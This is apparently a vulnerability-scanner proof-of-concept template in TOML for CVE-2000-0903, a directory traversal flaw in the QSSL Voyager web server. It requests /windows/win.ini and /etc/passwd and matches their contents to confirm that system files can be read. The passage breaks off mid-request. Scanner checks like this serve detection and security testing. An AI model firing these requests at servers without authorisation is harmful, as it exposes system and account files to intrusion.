[info]
author = "ave"
description = "验证 QSSL Voyager 2.0 1B Web 服务器目录遍历漏洞，可读取任意文件"
id = "POC-AVE-2000-0657"
name = "CVE-2000-0903 PoC"
severity = "medium"
tags = ["ave-2000-0657"]
vuln_id = [
    "CVE-2000-0903",
    "AVE-2000-0657",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/windows/win.ini"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "[extensions]",
    "fonts",
    "files",
]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/etc/passwd"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/windows/win.ini"
protocol = "http"

[poc.requests.body]
